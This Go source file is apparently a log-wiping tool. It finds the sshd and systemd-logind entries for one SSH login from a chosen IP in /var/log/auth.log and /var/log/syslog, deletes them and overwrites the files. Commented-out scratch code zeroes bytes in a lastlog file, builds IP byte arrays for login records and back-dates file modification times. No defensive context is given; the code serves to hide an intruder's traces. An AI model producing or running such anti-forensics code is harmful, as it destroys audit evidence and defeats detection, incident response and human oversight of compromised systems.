package main

import (
	"fmt"
	"os"
	"regexp"
	"sort"
	"strings"
	"time"
)

var AUTH_LOG string = "/var/log/auth.log"
var SYSLOG string = "/var/log/syslog"

var ip = "192.168.23.23"
var systemdLogInd string
var indexToStartForSystemLog int
var sessionId string
var indexToStartManipulate int

func main() {
	sessionStart := 1718273937
	sessionStop := 1718273939
	start, stop := getTimeStamps(sessionStart, sessionStop)
	// err := deleteLineAuthLog(AUTH_LOG, start, stop)
	err := deleteLineSyslog("22", start, stop)
	if err != nil {
		fmt.Println("Error:", err)
	} else {
		fmt.Println("Line deleted successfully")
	}
}

//Jun 13 09:17:42 ubuntu systemd[1]: Started Session 8 of User ubuntu.

func deleteLineSyslog(sessionID string, SplitTimeStart, SplitTimeStop []string) error {
	file, err := os.ReadFile(SYSLOG)
	if err != nil {
		return err
	}
	stringSliceOfSyslog := strings.Split(string(file), "\n")
	pattern := fmt.Sprintf(`^(.*(%s|%s))(.*systemd).*(Session\s*%s|session-%s\.scope:)`, SplitTimeStart[1], SplitTimeStop[1], sessionID, sessionID)
	// pattern := fmt.Sprintf(`(Session\s*%s)|(session-%s\.scope:)`, sessionID, sessionID)
	fmt.Println(pattern)
	re := regexp.MustCompile(pattern)
	linesToDel := []int{}
	for i, j := range stringSliceOfSyslog {
		match := re.MatchString(j)
		if match {
			linesToDel = append(linesToDel, i)
			fmt.Println(j, "  ", i)

		}
	}
	sort.Sort(sort.Reverse(sort.IntSlice(linesToDel)))
	for _, j := range linesToDel {
		fmt.Println(j, "<<<<")
		stringSliceOfSyslog = remove(stringSliceOfSyslog, j)
	}

	err = CopyFile(SYSLOG, stringSliceOfSyslog)
	return nil

}

func deleteLineAuthLog(filePath string, SplitTimeStart, SplitTimeStop []string) error {
	file, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	// fmt.Println(SplitTimeStart, "<<<<<<<<<<<<<<<<<<<")
	stringSliceOfAothLog := strings.Split(string(file), "\n")

	matchStartID := ""
	for i, j := range stringSliceOfAothLog {
		if strings.Contains(j, "sshd") && strings.Contains(j, ip) && strings.Contains(j, SplitTimeStart[1]) {
			pattern := regexp.MustCompile(`sshd\[(\d+)\]`)
			matches := pattern.FindAllStringSubmatch(j, -1)
			matchStartID = matches[0][1] // ID
			indexToStartManipulate = i
			fmt.Println(j, matches[0][1], i, "AAAAAA")
			break
		}
	}

	matchStopID := ""
	for i, j := range stringSliceOfAothLog[indexToStartManipulate:] {
		if strings.Contains(j, "sshd") && strings.Contains(j, ip) && strings.Contains(j, SplitTimeStop[1]) {
			pattern := regexp.MustCompile(`sshd\[(\d+)\]`)
			matches := pattern.FindAllStringSubmatch(j, -1)
			matchStopID = matches[0][1]
			fmt.Println(j, matches[0][1], i, "XAXAXAXAXAX")
			break
		}
	}

	/////////////////////////////////////////////Find INDEXES

	IntlinesToDel := []int{}
	StringLinesToDel := []string{}
	GetIndexesToDelete(&stringSliceOfAothLog, &IntlinesToDel, &StringLinesToDel, matchStartID, false)
	GetIndexesToDelete(&stringSliceOfAothLog, &IntlinesToDel, &StringLinesToDel, matchStopID, false)
	// GetIndexesToDelete(&stringSliceOfAothLog, &IntlinesToDel, &StringLinesToDel, matchStopID)

	for _, j := range stringSliceOfAothLog[indexToStartForSystemLog:] {
		pattern := regexp.MustCompile(`systemd-logind\[(\d+)\]: (New session|Session \d+ )`)
		matches := pattern.FindAllStringSubmatch(j, -1)

		if len(matches) > 0 {
			pattern := regexp.MustCompile(`systemd-logind\[(\d+)\]`)
			matches := pattern.FindAllStringSubmatch(j, -1)
			systemdLogInd = matches[0][1]
			pattern = regexp.MustCompile(`New session (\d+)`)
			matchesSession := pattern.FindStringSubmatch(j)
			fmt.Println(matchesSession, "AAAAA")
			sessionId = matchesSession[1]

			// fmt.Println(matches, "<<<<<<<<<<<<<AAAA<<<<AAAAAA<<<A<A<A<", )
			break
		}
	}
	patternSystemLogInd := fmt.Sprintf(`^.*systemd-logind\[%s\].*(Session %s logged out|Removed session %s|New session %s)`, systemdLogInd, sessionId, sessionId, sessionId)
	GetIndexesToDelete(&stringSliceOfAothLog, &IntlinesToDel, &StringLinesToDel, patternSystemLogInd, true)

	sort.Sort(sort.Reverse(sort.IntSlice(IntlinesToDel)))
	fmt.Printf("Final Data: StartLogin %s, EndLogin: %s systemLoginInId :%s, Lines To Del %v, Session ID ,%s \n", matchStartID, matchStopID, systemdLogInd, IntlinesToDel, sessionId)
	for _, index := range IntlinesToDel {
		stringSliceOfAothLog = remove(stringSliceOfAothLog, index)
	}

	err = CopyFile(AUTH_LOG, stringSliceOfAothLog)

	return nil
}

func CopyFile(filepath string, strings []string) error {

	file, err := os.OpenFile(filepath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		fmt.Println(err)
		return err
	}
	defer file.Close()

	for _, j := range strings {
		_, err := file.WriteString(j + "\n")
		if err != nil {
			fmt.Println(err)
			return err
		}
	}

	fmt.Println("All strings written to file successfully")
	return nil
}

func GetIndexesToDelete(stringSliceOfAothLog *[]string, IntlinesToDel *[]int, StringLinesToDel *[]string, matchString string, getSession bool) {

	re := regexp.MustCompile(matchString)
	for i, j := range (*stringSliceOfAothLog)[indexToStartManipulate:] {
		if re.MatchString(j) {

			(*IntlinesToDel) = append((*IntlinesToDel), i+indexToStartManipulate)
			(*StringLinesToDel) = append((*StringLinesToDel), j)
			if strings.Contains(j, "Accepted password for") {
				indexToStartForSystemLog = i + indexToStartManipulate
			}
		}
	}
}

func remove(slice []string, index int) []string {
	if index < 0 || index >= len(slice) {
		fmt.Println("Index out of range")
		return slice
	}
	return append(slice[:index], slice[index+1:]...)
}

func getTimeStamps(sessionStart, sessionStop int) ([]string, []string) {
	tStart := time.Unix(int64(sessionStart), 0).UTC()
	localTimeStart := tStart.Local()
	SplitTimeStart := strings.Split(localTimeStart.Format("2006-01-02 15:04:05"), " ")

	tStop := time.Unix(int64(sessionStop), 0).UTC()
	localTimeStop := tStop.Local()
	SplitTimeStop := strings.Split(localTimeStop.Format("2006-01-02 15:04:05"), " ")
	fmt.Println(SplitTimeStart, SplitTimeStop)

	return SplitTimeStart, SplitTimeStop

}

// r'(\w{3} \d{2} \d{2}:\d{2}:\d{2}) ubuntu sshd\[\d+\]: (Accepted|Connection reset|Failed password|Received disconnect|pam_unix\(sshd:session\): session (opened|closed)) for user ubuntu from 192.168.23.23 port (\d+)')

// tempFile, err := os.Create(TEMP)
// if err != nil {
// 	return err
// }
// for _, j := range s {
// 	_, err := tempFile.WriteString(j + "\n")
// 	if err != nil {
// 		fmt.Println(err)
// 	}

// }

// fmt.Println(s)
// scanner := bufio.NewScanner(file)

// currentLine := 0
// for scanner.Scan() {
// 	currentLine++
// 	if currentLine == lineNumber {
// 		continue // Skip the line to be deleted
// 	}
// 	x, err := tempFile.WriteString(scanner.Text() + "\n")
// 	fmt.Println(x)
// 	if err != nil {
// 		return err
// 	}
// }

// input, err := os.ReadFile(tempFile.Name())
// if err != nil {
// 	fmt.Println(err)

// }
// fmt.Println(input)
// err = os.WriteFile("/home/ubuntu/go/src/ttt.txt", input, 0644)
// if err != nil {
// 	fmt.Println("Error creating")
// 	fmt.Println(err)

// }
// // os.Remove(tempFile.Name())

// // if err := scanner.Err(); err != nil {
// // 	return err
// // }

// // tempFileName := tempFile.Name()
// // fmt.Println(tempFileName)
// // file.Close()
// // tempFile.Close()

// // err = os.Rename(tempFileName, filePath)
// // if err != nil {
// // 	return err
// // }

// 	return nil
// }

// package main

// import (
// 	"fmt"
// 	"strings"
// )

// func main() {

// 	x := []byte{112, 116, 115, 47, 50, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
// 	// z :=
// 	// fmt.Println(z, "<<<<<<<<<<<<<<<<")
// 	if strings.Contains(strings.TrimRight(string(x), "\x00"), "pts") {
// 		fmt.Println("OK")
// 	}

// }

// func test(ip *string) {
// 	var asciiBytes []byte

// 	for i := 0; i < len(*ip); i++ {
// 		// fmt.Println(ip[i])
// 		asciiBytes = append(asciiBytes, (*ip)[i])
// 	}

// 	// Print the ASCII byte values
// 	// for _, b := range asciiBytes {
// 	// 	fmt.Printf("%d ", b)
// 	// }
// 	fmt.Println(asciiBytes)
// }

// package main

// import (
// 	"fmt"
// )

// func main() {
// 	ip := "192.168.23.23"
// 	test(&ip)
// }

// func test(ip *string) {
// 	var asciiBytes []byte

// 	for i := 0; i < len(*ip); i++ {
// 		// fmt.Println(ip[i])
// 		asciiBytes = append(asciiBytes, (*ip)[i])
// 	}

// 	// Print the ASCII byte values
// 	// for _, b := range asciiBytes {
// 	// 	fmt.Printf("%d ", b)
// 	// }
// 	fmt.Println(asciiBytes)
// }

// package main

// import (
// 	"bytes"
// 	"encoding/binary"
// 	"fmt"
// )

// func main() {
// 	var number int = 192

// 	// To handle both 32-bit and 64-bit architectures, you can use int32 or int64
// 	var number8 int8 = int8(number) // Convert to int64 for this example

// 	// Create a buffer
// 	buffer := new(bytes.Buffer)

// 	// Write the int64 number to the buffer in BigEndian order
// 	err := binary.Write(buffer, binary.BigEndian, number8)
// 	if err != nil {
// 		fmt.Println("binary.Write failed:", err)
// 	}

// 	// Get the final byte array
// 	finalByteArray := buffer.Bytes()
// 	fmt.Printf("Final byte array: %v\n", finalByteArray)
// }

// package main

// import (
// 	"fmt"
// 	"reflect"
// )

// func main() {
// 	slice1 := []byte{192, 168, 23, 23, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
// 	slice2 := []byte{192, 168, 23, 23, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}

// 	if reflect.DeepEqual(slice1, slice2) {
// 		fmt.Println("The slices are equal.")
// 	} else {
// 		fmt.Println("The slices are not equal.")
// 	}
// }

// package main

// import "fmt"

// func main() {
// 	// Define the initial part of the byte array
// 	initialBytes := []byte{192, 168, 23, 23}

// 	// Define the number of additional zero bytes needed
// 	zeroBytes := make([]byte, 12)

// 	// Append the zero bytes to the initial byte array
// 	byteArray := append(initialBytes, zeroBytes...)

// 	// Print the byte array
// 	fmt.Println(byteArray)
// }

// package main

// import (
// 	"fmt"
// )

// func main() {
// 	filePath := "example.txt"
// 	start := int64(5)          // Start deleting from the 6th byte (zero-based index)
// 	bytesToDelete := int64(10) // Number of bytes to delete

// 	err := deleteBytesFromFile(filePath, start, bytesToDelete)
// 	if err != nil {
// 		fmt.Println("Error:", err)
// 		return
// 	}

// 	fmt.Println("Bytes deleted successfully.")
// }

// var network bytes.Buffer
// enc := gob.NewEncoder(&network)
// enc.Encode(P{3, 4, 5, "Pythagoras"})

// fmt.Println(network.Bytes())
// file, err := os.OpenFile(LASTLOG_FILEa, os.O_RDWR, 0644)
// if err != nil {
// 	fmt.Println(err)
// }

// defer file.Close()

// for i := int64(1); i <= 20; i++ {
// 	_, err := file.WriteAt([]byte("\x00"), i)
// 	if err != nil {
// 		log.Fatalf("failed writing to file: %s", err)
// 	}
// }
// // fmt.Printf("\nLength: %d bytes", len)
// fmt.Printf("\nFile Name: %s", file.Name())

// filePath := "hi.txt" // Path to the file whose modification time you want to change

// // Get the current time
// currentTime := time.Now()

// // Define the desired modification time (replace with your desired time)
// desiredModTime := time.Date(2022, time.January, 1, 12, 34, 56, 0, time.UTC)

// // Change the modification time of the file
// err := os.Chtimes(filePath, currentTime, desiredModTime)
// if err != nil {
// 	fmt.Printf("Error changing modification time: %v\n", err)
// 	return
// }

// fmt.Println("Modification time changed successfully")
// }
